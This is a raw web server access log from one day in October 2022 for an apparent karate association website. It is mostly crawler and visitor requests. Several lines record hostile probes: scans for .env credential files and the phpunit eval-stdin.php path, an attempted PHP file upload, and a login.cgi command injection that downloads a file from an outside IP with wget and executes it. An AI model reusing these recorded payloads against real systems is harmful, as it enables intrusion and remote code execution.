::ffff:194.225.24.214 - - [03/Oct/2022:00:02:50 +0000] "GET /wp-22.php?sfilename=on.php&sfilecontent=<%3F%3D409723%2A20%3B&supfiles=on.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 OPR/63.3.3216.58675"
::ffff:51.222.253.1 - - [03/Oct/2022:21:10:04 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.18 - - [03/Oct/2022:21:10:05 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [03/Oct/2022:21:10:06 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.12 - - [03/Oct/2022:21:10:06 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:20.79.216.153 - - [03/Oct/2022:21:11:03 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36"
::ffff:185.254.196.115 - - [03/Oct/2022:21:11:56 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [03/Oct/2022:21:11:57 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:37.139.53.82 - - [03/Oct/2022:21:21:32 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4093.3 Safari/537.36"
::ffff:37.139.53.82 - - [03/Oct/2022:21:21:32 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4093.3 Safari/537.36"
::ffff:37.139.53.82 - - [03/Oct/2022:21:21:33 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4093.3 Safari/537.36"
::ffff:66.249.75.223 - - [03/Oct/2022:21:24:00 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:45.79.171.66 - - [03/Oct/2022:21:25:06 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:66.249.75.197 - - [03/Oct/2022:21:27:06 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:37.139.53.82 - - [03/Oct/2022:21:28:07 +0000] "GET / HTTP/1.0" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36"
::ffff:37.139.53.82 - - [03/Oct/2022:21:28:08 +0000] "POST /sendemail HTTP/1.0" 302 40 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36"
::ffff:37.139.53.82 - - [03/Oct/2022:21:28:09 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.org/?err=error#signup" "Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36"
::ffff:45.79.171.66 - - [03/Oct/2022:21:28:19 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:216.244.66.196 - - [03/Oct/2022:21:49:26 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:216.244.66.196 - - [03/Oct/2022:21:52:28 +0000] "GET /docs/Self-DefenseAwarenessInfo.pdf HTTP/1.1" 404 173 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:114.119.137.123 - - [03/Oct/2022:21:57:47 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:66.249.75.206 - - [03/Oct/2022:21:59:55 +0000] "GET /docs/Bushido-code.pdf HTTP/1.1" 304 - "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:45.79.171.66 - - [03/Oct/2022:22:06:13 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:164.52.24.181 - - [03/Oct/2022:22:20:09 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
::ffff:164.52.24.181 - - [03/Oct/2022:22:20:16 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
::ffff:95.214.235.205 - - [03/Oct/2022:22:32:59 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [03/Oct/2022:22:33:00 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.11 - - [03/Oct/2022:22:35:28 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [03/Oct/2022:22:35:51 +0000] "GET /images/instructors/RuPaster.jpg HTTP/1.1" 200 75352 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.3 - - [03/Oct/2022:22:35:52 +0000] "GET /images/schools/zoomdonkaratedo.jpg HTTP/1.1" 200 32454 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.14 - - [03/Oct/2022:22:35:53 +0000] "GET /images/instructors/mbrooks.jpg HTTP/1.1" 200 132490 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [03/Oct/2022:22:35:53 +0000] "GET /images/schools/harborbaykaratedo.jpg HTTP/1.1" 200 77464 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [03/Oct/2022:22:35:54 +0000] "GET /images/instructors/wkklogo.png HTTP/1.1" 200 35114 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.15 - - [03/Oct/2022:22:35:55 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [03/Oct/2022:22:35:55 +0000] "GET /images/instructors/arce.jpg HTTP/1.1" 200 14433 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [03/Oct/2022:22:35:56 +0000] "GET /images/instructors/clarkb.jpeg HTTP/1.1" 200 12183 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.9 - - [03/Oct/2022:22:35:56 +0000] "GET /images/schools/zoomsfbakaratedo.jpg HTTP/1.1" 200 259024 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [03/Oct/2022:22:35:57 +0000] "GET /images/schools/earhartkaratedo.jpg HTTP/1.1" 200 35835 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [03/Oct/2022:22:35:57 +0000] "GET /images/instructors/andrea.jpg HTTP/1.1" 200 61330 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [03/Oct/2022:22:35:58 +0000] "GET /images/schools/nunleykaratedo.jpg HTTP/1.1" 200 77040 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.12 - - [03/Oct/2022:22:35:59 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [03/Oct/2022:22:35:59 +0000] "GET /images/instructors/fortiz.jpg HTTP/1.1" 200 82719 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.9 - - [03/Oct/2022:22:36:00 +0000] "GET /images/instructors/mlee.jpg HTTP/1.1" 200 65525 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.3 - - [03/Oct/2022:22:36:01 +0000] "GET /images/schools/alamedakaratedo.jpg HTTP/1.1" 200 86185 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [03/Oct/2022:22:36:01 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.9 - - [03/Oct/2022:22:36:02 +0000] "GET /images/instructors/carlos.jpg HTTP/1.1" 200 21431 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [03/Oct/2022:22:36:03 +0000] "GET /images/schools/martinezkaratedo.jpg HTTP/1.1" 200 1754187 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.11 - - [03/Oct/2022:22:36:04 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [03/Oct/2022:22:36:05 +0000] "GET /images/schools/orindakaratedo.jpg HTTP/1.1" 200 264927 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.19 - - [03/Oct/2022:22:36:05 +0000] "GET /images/igpic.webp HTTP/1.1" 200 1328 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [03/Oct/2022:22:36:06 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [03/Oct/2022:22:36:06 +0000] "GET /images/instructors/jorge8th.jpg HTTP/1.1" 200 121759 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [03/Oct/2022:22:36:07 +0000] "GET /images/fbpic.webp HTTP/1.1" 200 986 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [03/Oct/2022:22:36:07 +0000] "GET /images/instructors/fnavarro.jpg HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [03/Oct/2022:22:36:08 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [03/Oct/2022:22:36:08 +0000] "GET /images/instructors/achang.jpg HTTP/1.1" 200 32799 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [03/Oct/2022:22:36:09 +0000] "GET /images/instructors/herseybaker.jpg HTTP/1.1" 200 13988 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.11 - - [03/Oct/2022:22:36:09 +0000] "GET /images/schools/corpuzkaratedo.jpg HTTP/1.1" 200 65837 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [03/Oct/2022:22:36:10 +0000] "GET /images/instructors/amastroianni.jpg HTTP/1.1" 200 78389 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [03/Oct/2022:22:36:11 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [03/Oct/2022:22:36:11 +0000] "GET /images/schools/marinkaratedo.jpeg HTTP/1.1" 200 104735 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.15 - - [03/Oct/2022:22:36:12 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.8 - - [03/Oct/2022:22:36:12 +0000] "GET /images/instructors/anunley.jpg HTTP/1.1" 200 32690 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.18 - - [03/Oct/2022:22:36:13 +0000] "GET /images/instructors/geoffrey.jpg HTTP/1.1" 200 14922 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [03/Oct/2022:22:36:13 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [03/Oct/2022:22:36:14 +0000] "GET /images/instructors/acohen.jpg HTTP/1.1" 200 62805 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.5 - - [03/Oct/2022:22:36:15 +0000] "GET /images/instructors/amahalatinia.jpg HTTP/1.1" 200 84763 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.1 - - [03/Oct/2022:22:36:15 +0000] "GET /images/instructors/grant.jpg HTTP/1.1" 200 14249 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [03/Oct/2022:22:36:16 +0000] "GET /images/instructors/JohnPWKK.jpg HTTP/1.1" 200 7574 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [03/Oct/2022:22:36:16 +0000] "GET /images/instructors/btimlin.jpg HTTP/1.1" 200 378054 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [03/Oct/2022:22:36:17 +0000] "GET /images/instructors/anthony.jpg HTTP/1.1" 200 14045 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.3 - - [03/Oct/2022:22:36:18 +0000] "GET /images/instructors/rodnak.jpg HTTP/1.1" 200 12841 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [03/Oct/2022:22:36:18 +0000] "GET /images/instructors/justin.jpg HTTP/1.1" 200 14091 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [03/Oct/2022:22:36:18 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.18 - - [03/Oct/2022:22:36:19 +0000] "GET /images/schools/manzanitakaratedo.jpg HTTP/1.1" 200 1829058 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [03/Oct/2022:22:36:23 +0000] "GET /images/instructors/SenseiLarry.jpg HTTP/1.1" 200 60380 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.18 - - [03/Oct/2022:22:36:25 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.18 - - [03/Oct/2022:22:36:26 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.8 - - [03/Oct/2022:22:36:26 +0000] "GET /images/instructors/dokeeffe.jpg HTTP/1.1" 200 42708 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.8 - - [03/Oct/2022:22:36:27 +0000] "GET /images/instructors/don.jpg HTTP/1.1" 200 76210 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:206.189.134.134 - - [03/Oct/2022:22:46:31 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::ffff:206.189.134.134 - - [03/Oct/2022:22:46:31 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::ffff:206.189.134.134 - - [03/Oct/2022:22:46:32 +0000] "GET /vendor/.env HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::ffff:206.189.134.134 - - [03/Oct/2022:22:46:32 +0000] "GET /admin/.env HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::ffff:206.189.134.134 - - [03/Oct/2022:22:46:33 +0000] "GET /34.212.47.6/.env HTTP/1.1" 404 155 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::ffff:206.189.134.134 - - [03/Oct/2022:22:46:33 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 189 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::ffff:114.119.136.205 - - [03/Oct/2022:22:49:16 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.152.12 - - [03/Oct/2022:22:53:58 +0000] "GET /images/AiglaDojo2020.jpg HTTP/1.1" 404 163 "http://wadokikai.org/locations.php" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:198.235.24.15 - - [03/Oct/2022:23:03:46 +0000] "GET / HTTP/1.0" 200 58140 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:135.125.246.189 - - [03/Oct/2022:23:10:31 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [03/Oct/2022:23:10:31 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:192.241.202.127 - - [03/Oct/2022:23:11:04 +0000] "GET /portal/redlion HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:104.248.53.239 - - [03/Oct/2022:23:12:12 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:104.248.53.239 - - [03/Oct/2022:23:12:13 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:217.15.151.155 - - [03/Oct/2022:23:18:01 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://46.19.141.122/dlink%20-O%20-%3E%20/tmp/dlink;chmod%20777%20/tmp/dlink;sh%20/tmp/dlink%27$ HTTP/1.1" - - "-" "Hakai/2.0"
::ffff:135.125.246.189 - - [03/Oct/2022:23:27:23 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [03/Oct/2022:23:27:24 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.75.206 - - [03/Oct/2022:23:29:55 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.125 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:207.46.13.129 - - [03/Oct/2022:23:30:07 +0000] "GET /images/instructors/SenseiLarry.jpg HTTP/1.1" 200 60380 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:216.244.66.196 - - [03/Oct/2022:23:30:56 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:216.244.66.196 - - [03/Oct/2022:23:33:45 +0000] "GET /katas.html HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:114.119.137.141 - - [03/Oct/2022:23:41:29 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:103.83.174.148 - - [03/Oct/2022:23:46:51 +0000] "GET /administrator/index.php HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0"
::ffff:103.83.174.148 - - [03/Oct/2022:23:46:52 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0"
::ffff:51.222.253.11 - - [03/Oct/2022:23:48:36 +0000] "GET /events HTTP/1.1" 200 8805 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:34.76.96.55 - - [03/Oct/2022:23:51:52 +0000] "GET / HTTP/1.1" 200 58140 "-" "python-requests/2.28.1"
::ffff:146.70.41.144 - - [03/Oct/2022:23:57:34 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:146.70.41.144 - - [03/Oct/2022:23:57:34 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.152.130 - - [03/Oct/2022:23:59:12 +0000] "GET /resources HTTP/1.1" 200 194907 "https://wadokikai.org/contact?s=1&ss=4" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:192.241.208.116 - - [03/Oct/2022:23:59:50 +0000] "GET /actuator/health HTTP/1.1" 404 154 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:174.194.199.127 - - [03/Oct/2022:23:59:51 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:174.194.199.127 - - [03/Oct/2022:23:59:51 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
::ffff:174.194.199.127 - - [03/Oct/2022:23:59:51 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36"
